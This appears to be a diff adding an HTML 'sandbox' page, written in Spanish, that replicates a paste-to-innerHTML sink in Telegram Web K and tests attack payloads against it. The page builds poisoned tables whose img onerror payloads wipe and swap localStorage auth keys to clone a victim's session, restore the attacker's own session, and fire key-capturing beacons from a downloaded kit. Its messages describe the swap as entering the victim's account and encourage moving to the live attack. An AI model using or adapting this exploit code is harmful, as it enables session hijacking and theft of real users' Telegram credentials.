@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>T-20 SANDBOX v1</title>
+<style>
+  :root{color-scheme:dark}
+  body{margin:0;background:#0d1520;color:#cdd6e0;font:14px/1.5 system-ui;padding:14px}
+  h1{font-size:17px;color:#7aa5c9;margin:0 0 2px}
+  .sub{color:#5c7185;font-size:11.5px;margin-bottom:12px}
+  .card{background:#132133;border:1px solid #1f3247;border-radius:10px;padding:12px;margin-bottom:10px}
+  .card h2{font-size:12px;margin:0 0 8px;color:#7aa5c9;letter-spacing:.06em;text-transform:uppercase}
+  button{display:block;width:100%;margin:6px 0;padding:12px;border:0;border-radius:8px;background:#1c3a5e;color:#dce8f5;font-size:14px}
+  button:active{background:#28527f}
+  .verdict{font-weight:700;font-size:13px;margin-top:6px;padding:8px;border-radius:6px}
+  .ok{background:#0e2a18;color:#7ed491;border:1px solid #1f4b2e}
+  .bad{background:#2a1116;color:#ff8b96;border:1px solid #4b1f27}
+  .wait{background:#1d2735;color:#9db1c7}
+  .log{font:11px/1.45 ui-monospace,monospace;background:#0a111c;border-radius:6px;padding:8px;max-height:190px;overflow-y:auto;white-space:pre-wrap;color:#9fb5cc}
+  .stor{font:11px/1.5 ui-monospace,monospace;white-space:pre;color:#9fb5cc}
+  [contenteditable]{min-height:64px;border:1px dashed #2a4260;border-radius:8px;padding:10px;background:#0a111c}
+  table{border-collapse:collapse}td{border:1px solid #333;padding:2px 6px}
+  .sep{color:#415a72;font-size:11px;margin:10px 0 4px}
+</style>
+</head>
+<body>
+<h1>T-20 SANDBOX v1</h1>
+<div class="sub">Replica local del pipeline de pegado de Telegram Web K (segun trazado TRAZADOR: sink data-table-title-html → innerHTML en hidratacion). Se ejecuta en ESTE origen aislado: nada sale a internet, nada toca Telegram.</div>
+
+<div class="card">
+  <h2>Identidad simulada del navegador</h2>
+  <div class="stor" id="who"></div>
+  <button onclick="resetAll()" style="background:#2a1d33">REINICIAR SANDBOX (borra la sesion simulada)</button>
+</div>
+
+<div class="card">
+  <h2>Tests automaticos</h2>
+  <button onclick="testKit()">1 · TEST KIT v19 (captura)</button>
+  <div class="verdict wait" id="vKit" hidden></div>
+  <button onclick="testClone()">2 · TEST CLONE (conmutacion)</button>
+  <div class="verdict wait" id="vClone" hidden></div>
+  <button onclick="testRestore()">3 · TEST RESTORE (volver)</button>
+  <div class="verdict wait" id="vRestore" hidden></div>
+</div>
+
+<div class="card">
+  <h2>Pegado manual (proba el payload real de la consola aca)</h2>
+  <div id="sinkZone" contenteditable="true" placeholder="pegá acá"></div>
+  <div class="verdict wait" id="vManual" hidden></div>
+</div>
+
+<div class="card">
+  <h2>Log de beacons interceptados</h2>
+  <div class="log" id="log"></div>
+</div>
+
+<div class="card">
+  <h2>localStorage del sandbox (dc1-5 + user_auth)</h2>
+  <div class="stor" id="stor"></div>
+</div>
+
+<script>
+'use strict';
+const LOG=[];
+const SEED_PROME={id:111111,name:'prometeus-sandbox'};
+const MOCK_ABRAHAM={id:222222,name:'abraham-sandbox'};
+const CLAVES=['dc1_auth_key','dc2_auth_key','dc3_auth_key','dc4_auth_key','dc5_auth_key','dc1_server_salt','dc2_server_salt','dc3_server_salt','dc4_server_salt','dc5_server_salt'];
+let lastBeacon=null, BAKtest=null;
+
+function log(s){LOG.push(s);const el=$('log');el.textContent=LOG.slice(-80).join('\n');el.scrollTop=el.scrollHeight}
+function $(id){return document.getElementById(id)}
+function who(){try{return JSON.parse(localStorage.getItem('user_auth')||'{}').name||'(sin sesion)'}catch(e){return '?'}}
+function verdict(id,ok,txt){const v=$(id);v.hidden=false;v.className='verdict '+(ok?'ok':'bad');v.textContent=txt}
+function render(){
+  $('who').textContent='sesion actual: '+who();
+  const L=[];
+  for(const k of CLAVES){const v=localStorage.getItem(k);L.push(k.padEnd(16)+' = '+(v?v.slice(0,18)+'…('+v.length+')':'—'))}
+  L.push('user_auth'.padEnd(16)+' = '+(localStorage.getItem('user_auth')||'—').slice(0,40));
+  $('stor').textContent=L.join('\n');
+}
+function seed(){
+  if(localStorage.getItem('user_auth')&&localStorage.getItem('user_auth').indexOf('prometeus')>-1){
+    log('[seed] sesion prometeus ya presente ✓');return;
+  }
+  if(localStorage.getItem('user_auth')){
+    // sesion conmutada por un test previo: mostrar resultado
+    log('[persistida] la sesion activa tras la recarga es: '+who());
+    const b=$('vClone');b.hidden=false;b.className='verdict ok';
+    b.textContent='CONMUTACION OK: la pagina se recargo sola y la sesion activa es '+who()+' ✓';
+    return;
+  }
+  CLAVES.forEach((k,i)=>localStorage.setItem(k,'KEY_PROME_'+k+'_'+i));
+  localStorage.setItem('user_auth',JSON.stringify({id:SEED_PROME.id,name:SEED_PROME.name,dcID:2}));
+  log('[seed] sesion inicial: prometeus-sandbox (mock)');
+}
+function resetAll(){localStorage.clear();LOG.length=0;seed();render();}
+// --- interceptores: beacons, alert, reload ---
+window.alert=function(m){log('[alert] '+m)};
+const _fetch=window.fetch;
+window.fetch=function(url,opts){
+  if(String(url).indexOf('t20Beacon')>-1){
+    try{const b=JSON.parse(opts.body);lastBeacon=b;log('[beacon] '+b.marker+(b.extra?' · '+String(b.extra).slice(0,120):''))}catch(e){log('[beacon] ilegible')}
+    return Promise.resolve({ok:true,json:()=>Promise.resolve({}),text:()=>Promise.resolve('')});
+  }
+  return _fetch.apply(this,arguments);
+};
+try{Location.prototype.reload=function(){log('[recarga simulada] location.reload interceptada — sin recargar');render()}}catch(e){}
+
+// --- replica del sink (TRAZADOR: buttonMenu chunk, hydratePastedTableTitles) ---
+function hydrate(html){
+  const zone=document.createElement('div');zone.innerHTML=html;
+  const td=zone.querySelector('[data-table-title-html]');
+  if(!td){
+    const sl=zone.querySelector('[data-pm-slice]');
+    if(sl){
+      const slice=sl.getAttribute('data-pm-slice');
+      log('[paste] carril pm-slice (transporte de la CONSOLA) detectado ('+slice.length+' chars)');
+      try{
+        const arr=JSON.parse(slice.replace(/^\d+ \d+ /,''));
+        const trh=(arr&&arr[1]&&arr[1].titleRichHTML)||'';
+        if(!trh){log('[pm-slice] sin titleRichHTML → nada ejecuta');return false}
+        log('[pm-slice] hidratando titleRichHTML ('+trh.length+' chars) → innerHTML…');
+        const sink=document.createElement('div');
+        sink.innerHTML=trh;
+        $('sinkZone').appendChild(sink);
+        return true;
+      }catch(e){log('[pm-slice] JSON error: '+e.message);return false}
+    }
+    log('[paste] sin tabla con data-table-title-html → NADA EJECUTA (composer plano simulado)');return false}
+  const raw=td.getAttribute('data-table-title-html');
+  log('[paste] hidratando data-table-title-html ('+raw.length+' chars) → innerHTML…');
+  const sink=document.createElement('div');
+  sink.innerHTML=raw;               // ← el sink real de Telegram Web K
+  $('sinkZone').appendChild(sink);  // attach al DOM vivo (como el original)
+  return true;
+}
+// --- generador de tabla envenenada (misma tecnica del kit) ---
+function poisonTable(payload){
+  const t=document.createElement('table');t.setAttribute('border','1');
+  const tr=document.createElement('tr');const td=document.createElement('td');
+  td.textContent='·';
+  td.setAttribute('data-table-title-html','<img src=x onerror="'+payload.replace(/"/g,'&quot;')+'">');
+  tr.appendChild(td);t.appendChild(tr);t.appendChild(document.createElement('tbody'));
+  return t.outerHTML;
+}
+// payload clone/restore: version corregida (por nombre directo) identica a consola v13
+function payloadClone(S){
+  const wipe="var rm=['dc1_auth_key','dc2_auth_key','dc3_auth_key','dc4_auth_key','dc5_auth_key','dc1_server_salt','dc2_server_salt','dc3_server_salt','dc4_server_salt','dc5_server_salt','user_auth','previous-account','number_of_accounts','auth_key_fingerprint'];for(var i=0;i<12;i++)rm.push('account'+(i+1));rm.forEach(function(k){try{localStorage.removeItem(k)}catch(e){}});";
+  const backup="try{var BK={};['1','2','3','4','5'].forEach(function(n){['auth_key','server_salt'].forEach(function(suf){var k='dc'+n+'_'+suf,v=localStorage.getItem(k);if(v)BK[k]=v})});var ua=localStorage.getItem('user_auth');if(ua)BK.user_auth=ua;localStorage.setItem('__T20BAK',JSON.stringify(BK))}catch(e){}";
+  return "window.__CLONE=1;(async()=>{try{"+backup+wipe+"var S="+JSON.stringify(JSON.stringify(S))+";S=JSON.parse(S);Object.keys(S).forEach(function(k){try{localStorage.setItem(k,S[k])}catch(e){}});setTimeout(function(){location.reload()},300);}catch(e){}})();";
+}
+function payloadRestore(){
+  const wipe="var rm=['dc1_auth_key','dc2_auth_key','dc3_auth_key','dc4_auth_key','dc5_auth_key','dc1_server_salt','dc2_server_salt','dc3_server_salt','dc4_server_salt','dc5_server_salt','user_auth'];rm.forEach(function(k){try{localStorage.removeItem(k)}catch(e){}});";
+  return "window.__T20RB=1;(async()=>{try{var B=localStorage.getItem('__T20BAK');if(!B)return;var S=JSON.parse(B);"+wipe+"Object.keys(S).forEach(function(k){try{localStorage.setItem(k,S[k])}catch(e){}});setTimeout(function(){location.reload()},300);}catch(e){}})();";
+}
+// --- TEST 1: kit v19 en vivo (descarga el kit real del repo y lo ejecuta aca) ---
+async function testKit(){
+  verdict('vKit',false,'espera…');verdict('vKit',true,'descargando kit.html del repo…');
+  try{
+    const html=await (await _fetch('kit.html?t='+Date.now())).text();
+    const m=html.match(/onerror="([^"]{200,})"/);
+    if(!m){verdict('vKit',false,'kit sin payload');return}
+    const payload=m[1].replace(/&quot;/g,'"').replace(/&#39;/g,"'").replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&');
+    window.__T20S=0;lastBeacon=null;
+    hydrate(poisonTable(payload));
+    setTimeout(()=>{
+      const kb=LOG.find(l=>l.indexOf('T36-KEY')>-1);
+      const ok=window.__T20S===1&&kb;
+      verdict('vKit',ok,ok?'KIT OK: beacons disparados y T36-KEY capturado (revisá el log)':'KIT FALLO: revisá el log (¿sello K19?)');
+    },900);
+  }catch(e){verdict('vKit',false,'error: '+e.message)}
+}
+// --- TEST 2: clone (identidad simulada de "Abraham" capturada) ---
+function testClone(){
+  verdict('vClone',true,'inyectando… la página se recargará sola en 1 seg: eso ES la conmutación ✓');
+  if(who().indexOf('abraham')>-1){verdict('vClone',false,'ya estás en abraham-sandbox; primero TEST 3 o recargá');return}
+  const S={};
+  CLAVES.forEach((k,i)=>S[k]='KEY_ABRA_'+k+'_'+i);
+  S.user_auth=JSON.stringify({id:MOCK_ABRAHAM.id,name:MOCK_ABRAHAM.name,dcID:2});
+  hydrate(poisonTable(payloadClone(S)));
+  setTimeout(()=>{
+    const ok=who().indexOf('abraham')>-1&&localStorage.getItem('dc2_auth_key').indexOf('ABRA')>-1;
+    verdict('vClone',ok,ok?'CONMUTACION OK: el storage pasó a abraham-sandbox y el respaldo existe → en vivo esto es entrar en la cuenta de la víctima':'FALLO: el storage no conmutó');
+  },700);
+}
+// --- TEST 3: restore ---
+function testRestore(){
+  verdict('vRestore',false,'espera…');
+  hydrate(poisonTable(payloadRestore()));
+  setTimeout(()=>{
+    const ok=who().indexOf('prometeus')>-1;
+    verdict('vRestore',ok,ok?'RESTORE OK: volvió a prometeus-sandbox (en vivo: tu cuenta, sin SMS)':'FALLO: no volvió');
+  },700);
+}
+// --- pegado manual: el camino real ---
+document.addEventListener('paste',function(e){
+  const html=(e.clipboardData||window.clipboardData).getData('text/html');
+  log('[paste manual] html de '+(html||'0')+' chars');
+  verdict('vManual',true,'hidratando… mirá el log y el storage');
+  if(html){e.preventDefault();hydrate(html)}
+  setTimeout(()=>{render();
+    const kb=LOG.slice(-40).some(l=>l.indexOf('T36-KEY')>-1);
+    const mk=window.__T20CL||window.__T20RB;
+    const pv=window.__T20CL?('clone v'+window.__T20CL):(window.__T20RB?('restore v'+window.__T20RB):null);
+    if(mk)verdict('vManual',true,'EJECUTÓ DE VERDAD '+pv+' → andá a la prueba en vivo con confianza');
+    else if(kb)verdict('vManual',true,'EJECUTÓ (beacon KEY capturado; payload de kit válido)');
+    else if(who().indexOf('abraham')>-1)verdict('vManual',false,'OJO: el storage ya estaba en abraham de un TEST 2 previo, NO es prueba. Tocá REINICIAR SANDBOX y repetí el pegado');
+    else verdict('vManual',false,'el pegado llegó pero NO ejecutó: sin marcador de payload (titleRichHTML sin elemento ejecutable o clipboard dañado)');
+  },900);
+});
+seed();render();
+</script>
+</body>
+</html>
